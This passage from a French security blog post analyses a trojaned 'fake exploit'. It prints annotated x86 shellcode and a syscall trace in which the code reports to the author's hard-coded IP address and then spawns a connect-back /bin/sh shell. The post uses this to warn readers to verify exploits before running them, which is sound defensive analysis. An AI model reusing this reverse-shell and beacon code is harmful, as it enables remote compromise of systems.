    <span class="k">mov</span> <span class="err">[</span><span class="n">esi</span><span class="o">+</span><span class="mh">0x4</span><span class="err">]</span><span class="p">,</span> <span class="n">ebp</span>
    <span class="k">mov</span> <span class="n">dword</span> <span class="p">[esi],</span> <span class="mh">0x86358003</span>     <span class="c">; id number for exploit?</span>
    <span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0x4</span>                    <span class="c">; __NR_WRITE</span>
    <span class="k">lea</span> <span class="n">ecx</span><span class="p">,</span> <span class="p">[esi]</span>                  <span class="c">; const char *buf</span>
    <span class="k">xor</span> <span class="n">edx</span><span class="p">,</span> <span class="n">edx</span>
    <span class="k">add</span> <span class="n">edx</span><span class="p">,</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0xc</span>              <span class="c">; size_t count = 12</span>
    <span class="k">int</span> <span class="mh">0x80</span>

    <span class="c">; go back to do the same</span>
    <span class="c">; socket(PF_INET, SOCK_STREAM, 0);</span>
    <span class="c">; connect(sockfd, {sa_family=AF_INET, sin_port=htons(2987), sin_addr=inet_addr("127.0.0.1")}, 16);</span>
    <span class="c">; write(sockfd, buf, 12);</span>
    <span class="k">mov</span> <span class="n">dword</span> <span class="p">[esi],</span> <span class="mh">0xab0b0002</span>     <span class="c">; 0x2 =&gt; AF_INET and 0x0bab = 2987 = port</span>
    <span class="k">mov</span> <span class="err">[</span><span class="n">esi</span><span class="o">+</span><span class="mh">0x4</span><span class="err">]</span><span class="p">,</span> <span class="n">ebp</span>
    <span class="k">nop</span>
    <span class="k">xor</span> <span class="n">edi</span><span class="p">,</span> <span class="n">edi</span>
    <span class="k">inc</span> <span class="n">edi</span>
    <span class="k">jmp</span> <span class="n">short</span> <span class="p">.</span><span class="n">connection</span>

<span class="p">.</span><span class="n">launchshell</span><span class="o">:</span>
    <span class="c">; dup2(sockfd, 0)</span>
    <span class="k">nop</span>
    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
    <span class="k">add</span> <span class="n">eax</span><span class="p">,</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0x3f</span>             <span class="c">; dup2</span>
    <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>                    <span class="c">; stdin</span>
    <span class="k">push</span> <span class="n">eax</span>
    <span class="k">int</span> <span class="mh">0x80</span>

    <span class="c">; dup2(sockfd, 1)</span>
    <span class="k">pop</span> <span class="n">eax</span>
    <span class="k">inc</span> <span class="n">ecx</span>                         <span class="c">; stdout</span>
    <span class="k">int</span> <span class="mh">0x80</span>

    <span class="c">; execve("/bin/sh", ["/bin/sh", NULL], [NULL])</span>
    <span class="k">mov</span> <span class="n">dword</span> <span class="p">[esi],</span> <span class="s">"/bin"</span>
    <span class="k">mov</span> <span class="n">dword</span> <span class="err">[</span><span class="n">esi</span><span class="o">+</span><span class="mh">0x4</span><span class="err">]</span><span class="p">,</span> <span class="s">"/sh"</span>
    <span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">esi</span>
    <span class="k">add</span> <span class="n">eax</span><span class="p">,</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0x8</span>
    <span class="k">mov</span> <span class="err">[</span><span class="n">esi</span><span class="o">+</span><span class="mh">0x8</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>
    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
    <span class="k">mov</span> <span class="err">[</span><span class="n">esi</span><span class="o">+</span><span class="mh">0xc</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>
    <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0xb</span>                     <span class="c">; execve()</span>
    <span class="k">lea</span> <span class="n">edx</span><span class="p">,</span> <span class="err">[</span><span class="n">esi</span><span class="o">+</span><span class="mh">0xc</span><span class="err">]</span>              <span class="c">; char const *envp[]</span>
    <span class="k">lea</span> <span class="n">ecx</span><span class="p">,</span> <span class="err">[</span><span class="n">esi</span><span class="o">+</span><span class="mh">0x8</span><span class="err">]</span>              <span class="c">; char const *argv[]</span>
    <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">esi</span>                    <span class="c">; filename path</span>
    <span class="k">int</span> <span class="mh">0x80</span>

    <span class="c">; exit(ebx)</span>
    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
    <span class="k">inc</span> <span class="n">eax</span>
    <span class="k">int</span> <span class="mh">0x80</span></pre></td></tr></tbody></table></code></pre></figure>

<p>On finit par avoir quelque chose qui ressemble à ça:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="code"><pre><span class="n">sockfdAuthor</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">PF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="n">IPPROTO_IP</span><span class="p">);</span>
<span class="n">connect</span><span class="p">(</span><span class="n">sockfdAuthor</span><span class="p">,</span> <span class="p">{</span><span class="n">sa_family</span><span class="o">=</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">sin_port</span><span class="o">=</span><span class="n">htons</span><span class="p">(</span><span class="mi">2988</span><span class="p">),</span> <span class="n">sin_addr</span><span class="o">=</span><span class="n">inet_addr</span><span class="p">(</span><span class="s">"151.196.71.160"</span><span class="p">)},</span> <span class="mi">16</span><span class="p">);</span>
<span class="n">write</span><span class="p">(</span><span class="n">sockfdAuthor</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">12</span><span class="p">);</span>
<span class="n">sockfdYou</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">PF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="n">IPPROTO_IP</span><span class="p">);</span>
<span class="n">connect</span><span class="p">(</span><span class="n">sockfdYou</span><span class="p">,</span> <span class="p">{</span><span class="n">sa_family</span><span class="o">=</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">sin_port</span><span class="o">=</span><span class="n">htons</span><span class="p">(</span><span class="mi">2987</span><span class="p">),</span> <span class="n">sin_addr</span><span class="o">=</span><span class="n">inet_addr</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">)},</span> <span class="mi">16</span><span class="p">)</span> <span class="o">=</span> <span class="mi">4</span>
<span class="n">dup2</span><span class="p">(</span><span class="n">sockfdYou</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="n">dup2</span><span class="p">(</span><span class="n">sockfdYou</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
<span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="p">[</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">],</span> <span class="p">[</span><span class="nb">NULL</span><span class="p">]);</span></pre></td></tr></tbody></table></code></pre></figure>

<p>le 127.0.0.1 est modifié dans le code du sploit.
Mais wahou, … la machine attaquée se connecte à l’auteur et lui envoie quelques infos (comme l’ip de l’attaquant).</p>

<p>Bonne manière de tracer les kikoos qui vont s’aventurer à lancer le sploit … par contre pas trop éthique je pense ;).</p>

<h1 id="conclusion">Conclusion</h1>

<p>Ce sont de vieux “exploits” mais ils illustrent parfaitement l’importance de l’analyse du code et de la “décortication” de binaires, exploits, shellcodes, etc.</p>

<p>Avoir des tools d’analyse performants et efficaces est une gageure donc assez majeure dans le domaine de l’informatique. Sans tools, on fait pas grand choses … mais ne vous fiez pas que à vos tools ;).</p>

<p>J’espère que ça vous a ouvert un minimum les yeux ;). Quand c’est trop beau pour être vrai, faut se poser des questions après tout.</p>

<p>Cet article pourrait également donner des idées à certains pour “poutrer” les scripts kiddies et empêcher qu’ils fassent des dégâts. Je ne saurais trop le conseiller … ce n’est pas éthique et non légal de le faire. Donc à vos risques et périls.</p>

<p>Vous pourriez par contre toujours afficher un dialog box: “Get lost” ;).</p>

<p>Au passage, si vous trouvez des “fake sploits”, n’hésitez pas à me faire signe. De plus ça pourrait être intéressant de constituer une base de données les repertoriants.</p>

<p>Sur ce,</p>

<p>A la prochaine pour de nouvelles aventures,</p>

<p>m_101</p>

  </div>

  <div class="post-navigation">
    
    <a class="post-prev" href="//2011/07/17/ras-le-bol-adage-bad-hackers.html">Previous : Ras le bol de l'adage popularisé: "hackers = méchants"</a>
    

    
    <a class="post-next" href="//2011/11/16/ps3-hacking-part-1-exploitation.html">Next : PS3 Hacking (Part 1) - Exploitation</a>
    
  </div>

  
    <div id="disqus_thread"></div>
    <script>
        var disqus_config = function () {
            this.page.url = "http://binholic.com/2011/07/23/de-limportance-de-verifier-les-exploits.html";
            this.page.identifier = "/2011/07/23/de-limportance-de-verifier-les-exploits";
        };

        (function() { // DON'T EDIT BELOW THIS LINE
            var d = document, s = d.createElement('script');

            s.src = '//binholic.disqus.com/embed.js';

            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
  

</article>

      </div>
    </div>

    <footer class="site-footer">

  <div class="wrapper">

      <div class="site-footer">
        <ul class="social-media-list">
          
          <li>
            <a href="https://github.com/m101"><span class="icon icon--github"><svg viewBox="0 0 16 16"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
</span></a>

          </li>
          

          
          <li>
            <a href="https://twitter.com/w_levin"><span class="icon icon--twitter"><svg viewBox="0 0 16 16"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
</span></a>

          </li>
          

          
          <li>
            <a href="mailto:m101.sec@gmail.com"><span class="icon icon--email"><?xml version="1.0" encoding="UTF-8"?>
<!-- Generator: Adobe Illustrator 16.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="240.665px" height="250px" viewBox="43.833 205.167 240.665 250" enable-background="new 43.833 205.167 240.665 250" xml:space="preserve">
<g>
	<path fill="#323232" d="M221.459,396.62c-8.84,0-15.904-2.21-21.191-6.63c-5.289-4.42-8.449-10.441-9.488-18.07   c-4.855,5.895-10.66,10.965-17.42,15.21c-6.762,4.249-14.561,6.37-23.4,6.37c-6.59,0-12.83-1.256-18.72-3.77   c-5.895-2.512-11.095-6.15-15.6-10.92c-4.509-4.766-8.105-10.571-10.79-17.42c-2.689-6.846-4.03-14.69-4.03-23.531   c0-9.879,1.56-19.064,4.68-27.56c3.12-8.49,7.365-15.86,12.74-22.1c5.371-6.24,11.7-11.136,18.98-14.69   c7.28-3.551,15.08-5.33,23.4-5.33c9.01,0,16.68,1.82,23.01,5.461c6.324,3.639,11.311,8.234,14.949,13.779l2.34-17.42h20.541   l-10.66,85.02c-0.52,3.99-0.781,7.021-0.781,9.101c0,5.029,1.041,8.929,3.121,11.7c2.08,2.774,5.545,4.16,10.4,4.16   c4.504,0,8.84-1.646,13-4.94c4.16-3.29,7.799-7.931,10.92-13.91c3.119-5.979,5.589-13.085,7.41-21.319   c1.82-8.23,2.729-17.291,2.729-27.17c0-11.961-2.123-23.051-6.369-33.281c-4.25-10.225-10.228-19.064-17.939-26.52   c-7.715-7.451-16.859-13.26-27.43-17.42c-10.576-4.16-22.189-6.24-34.842-6.24c-16.119,0-30.464,3.165-43.029,9.49   c-12.57,6.33-23.14,14.605-31.72,24.83c-8.58,10.229-15.08,21.799-19.5,34.71c-4.42,12.915-6.63,26.045-6.63,39.39   c0,15.08,2.34,28.516,7.02,40.301c4.68,11.789,11.18,21.795,19.5,30.029c8.32,8.23,18.11,14.471,29.38,18.721   c11.265,4.244,23.485,6.369,36.661,6.369c13.17,0,24.914-1.561,35.229-4.68c10.311-3.121,20.15-6.936,29.512-11.439l7.539,19.76   c-9.016,4.85-19.891,8.924-32.631,12.219c-12.738,3.291-26.479,4.941-41.209,4.941c-16.64,0-31.98-2.516-46.02-7.541   c-14.04-5.029-26.175-12.439-36.4-22.23c-10.229-9.795-18.2-21.84-23.92-36.139c-5.72-14.301-8.58-30.811-8.58-49.53   c0-17.331,2.99-33.841,8.97-49.53c5.98-15.686,14.471-29.51,25.48-41.47c11.005-11.96,24.266-21.45,39.78-28.47   c15.51-7.02,32.889-10.53,52.129-10.53c16.291,0,31.156,2.645,44.59,7.93c13.432,5.29,24.916,12.524,34.451,21.71   c9.529,9.189,16.898,20.064,22.1,32.63c5.199,12.568,7.799,26.129,7.799,40.689c0,12.48-1.518,23.965-4.549,34.45   c-3.035,10.489-7.195,19.5-12.48,27.04c-5.289,7.54-11.615,13.391-18.98,17.55C238.139,394.54,230.124,396.62,221.459,396.62z    M156.979,374.26c6.76,0,13-1.86,18.721-5.59c5.719-3.725,10.311-7.756,13.779-12.09l6.24-51.48   c-3.469-5.545-7.975-10.051-13.52-13.52c-5.551-3.465-11.875-5.2-18.98-5.2c-5.201,0-10.23,1.17-15.08,3.511   c-4.855,2.34-9.145,5.635-12.87,9.879c-3.729,4.25-6.675,9.32-8.84,15.211c-2.169,5.895-3.25,12.395-3.25,19.5   c0,13.174,3.291,23.1,9.88,29.77C139.645,370.925,147.62,374.26,156.979,374.26z"/>
</g>
</svg></span></a>

          </li>
          

          
          <li>
            <a href="http://127.0.0.1:8888/USK@ABR8mm2t1L1G8cBG70cDy4PHFO6LPV~LrA-RIZxgOGI,pnGWUxb7k8~5-ywwqnBakTXx5ZFw6QzzZj7H~45NgE8,AQACAAE/binholic/-1/"><span class="icon icon--freenet"><?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!-- Created with Inkscape (http://www.inkscape.org/) -->
<svg
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns="http://www.w3.org/2000/svg"
   version="1.0"
   width="79.12"
   height="52.64">
  <defs/>
  <g
     transform="translate(-47.495719,-111.30691)">
    <path
       d="M 80.03,122.66 C 94.49,107.06 104.32,113.99 87.53,124.89 C 82.19,128.36 83.58,129.37 87.17,128.82 C 92.24,128.05 95.01,129.02 96.24,129.98 C 99.18,132.28 100.65,130.57 101.64,128.82 C 103.61,125.35 110.25,129.12 105.39,132.75 C 101.59,135.58 102.12,138.77 105.57,140.61 C 111.96,144.01 126.30,150.75 124.14,157.93 C 123.26,160.86 121.67,163.62 118.07,159.89 C 111.32,152.92 106.83,146.97 91.28,144.54 C 81.24,142.96 71.15,140.33 61.46,145.25 C 56.90,147.67 51.16,149.23 49.94,146.37 C 48.35,142.64 56.47,139.57 64.32,138.82 C 69.42,138.33 73.99,134.99 67.00,133.29 C 58.39,130.64 68.28,123.09 74.50,124.89 C 78.55,126.07 78.95,123.83 80.03,122.66 z"
       style="fill:#ffffff;stroke:#356ace;stroke-width:1.5;" />
  </g>
</svg>
</span></a>

          </li>
          
        </ul>
      </div>

    </div>

  </div>

</footer>


  </body>

</html>
